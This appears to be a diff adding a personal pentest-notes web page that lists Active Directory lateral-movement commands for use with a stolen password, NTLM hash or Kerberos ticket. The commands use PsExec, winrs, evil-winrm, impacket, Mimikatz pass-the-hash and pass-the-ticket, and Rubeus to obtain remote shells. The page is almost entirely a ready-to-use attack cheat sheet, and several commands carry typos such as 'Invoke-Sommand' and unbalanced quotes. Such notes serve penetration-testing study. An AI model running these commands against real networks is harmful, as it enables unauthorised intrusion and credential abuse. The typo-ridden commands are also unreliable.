@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+
+<head>
+  <meta https-equiv="content-type" content="text/html; charset=UTF-8">
+
+  <title>Active Directory Further Access</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, width=device-width">
+  <meta name="description" content="My notes from various labs and certs.">
+  <meta name="robots" content="index, follow">
+  <meta property="og:url" content="https://eli2k.com/">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Home">
+  <meta property="og:description" content="Home">
+  <meta property="og:image" content="https://eli2k.com/resources/images/homepage.png">
+  
+  <link rel="stylesheet" href="https://eli2k.com/resources/css/style.css">
+  <link rel="icon" href="https://eli2k.com/resources/images/bluscrn.gif" type="image/gif">
+  <link rel="stylesheet" href="https://eli2k.com/resources/css/prism.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+	<input type="checkbox" class="theme-switch" id="theme-switch"/>
+	<div id="page">
+		<label for="theme-switch" class="switch-label"></label>
+  <body class="line-numbers">
+  <script src="https://eli2k.com/resources/js/prism.js"></script>
+  <script>
+    NekoType = "robot"
+  </script>
+  <h1 id=nl>
+    <script src="https://webneko.net/n20171213.js"></script><a href="https://webneko.net">Neko</a>
+  </h1>
+  <div id="container">
+    <div id="header">
+      <div class="text-container">
+        <span>E</span>
+        <span>L</span>
+        <span>I</span>
+        <span>2</span>
+        <span>K</span>
+       </div>
+    </div>
+
+    <div id="left-sidebar"></div>
+    <div class="divider"></div>
+    <div class="pageContent">
+
+      <div class="nav border">
+        <ul>
+          <a href="https://eli2k.com/" title="The homepage. acts as an index for all of the indexes.">
+            <li>Home
+            </li>
+          </a>
+          <a href="https://github.com/Eli2k765" title="My Github.">
+            <li>Github
+            </li>
+          </a>
+
+        </ul>
+      </div>
+      <div class="page-content blog border"><button id="toggle-all-btn">Show All</button>
+        <div class="box">
+          <div class="inner-box-content">
+            <div class="article-wrapper">
+              <h1>Further Active Directory Access</h1>
+              <p class="alert">What to do once you have a password, hash, or ticket.</p>
+	      <strong>Last updated: May 4th, 2023</strong>
+	      <article>
+	      <div id="contain">
+	      <h2>Unrestricted Access</h2>
+	      <pre><code class="language-powershell">winrs -r:{HOSTNAME} cmd
+
+.\psExec.exe \\{HOSTNAME} cmd
+
+$sess = New-PSSession -ComputerName {HOST}
+Enter-PSSession -Session $sess
+
+$sess= New-PSSession -ComputerName {HOST}
+Invoke-Sommand -Session $sess -ScriptBlock {ipconfig;whoami;pwd}
+
+Invoke-WSManWinRM -hostname {HOST} -command cmd</code></pre>
+	      <h2>With a Password (PTP)</h2>
+	      <pre><code class="language-powershell">winr -r:{HOST} -u:{DOMAIN}/{USER} -p:{PASS} cmd
+.\PsExec.exe -u {DOMAIN}/{USER} -p {PASS} \\{HOSTNAME} cmd
+impacket-psexec {DOMAIN}/{USER}:{PASS}@{IP}
+Invoke-WSManWinRM -hostname {HOST} -command cmd -user {DOMAIN}\{USER} -password {PASS}
+evil-winrm -i {ip} -u {DOMAIN}/{USER}' -p {PASS}
+rdesktop -a 16 {IP} -u {DOMAIN}\{USER} -p {PASS}
+xfreerdp /v:{IP} /u:"{USER}" /p:{PASS}</code></pre>
+
+	      <h2>With a Hash (PTH)</h2>
+	      <pre><code class="language-powershell">Invoke-Mimikatz -Command '''sekurlsa::pth/user:{USER} /domain:{DOMAIN} /ntlm:{NTLM} /run:powershell.exe
+impacket-psexec -hashes ":{NTLM} {USER}@{IP}
+evil-winrm -u {username} -H {hash} -i {IP}
+pth-winexe -U {Domain}/{USER}%{NT:LM} // {IP} cmd</code></pre>
+
+	      <h2>With a Ticket (PTT)</h2>
+	      <pre><code class="language-powershell">Invoke-Mimikatz -Command '''kerberos::ptt <C:\Path\To\Ticket>'''
+Rubeus.exe ptt /ticket:<base64 Ticket>
+
+.\PsExec.exe -accepteula \\<HOST> cmd
+winrs -r:<HOST> cmd</code></pre>
+
+	      <h2>OverPass the Hash (PTK)</h2>
+	      <pre><code class="language-powershell">Rubeus.exe asktgt /user:<USER> /rc4:<NTLM> /ptt
+.\PsExec.exe -accepteula \\<HOST> cmd
+winrs -r:<HOST> cmd
+
+Invoke-Mimikatz -Command '''sekurlsa::pth /user:<USER> /domain:<Full.Domain> /aes256:<aes256key> /run:cmd.exe'''
+
+1- impacket-getTGT <domain.full>/<USER> -hashes ":<NTLM>"
+2- export KRB5CCNAME=$(pwd)/<USER>.ccache
+3- impacket-psexec <domain.full>/<USER>@<IP> -k -no-pass</code></pre>
+                    </div>
+                  </div>
+                </article>
+              </div>
+            </div>
+          </div>
+    <div class="footer border">
+    </div>
+    
+    </div>
+  </div>
+  <script src="https://eli2k.com/resources/js/themeSwitch.js"></script>
+  <script src="https://eli2k.com/resources/js/collapseList.js"></script>
+  
+	</body>
+</body>
+
+</html>
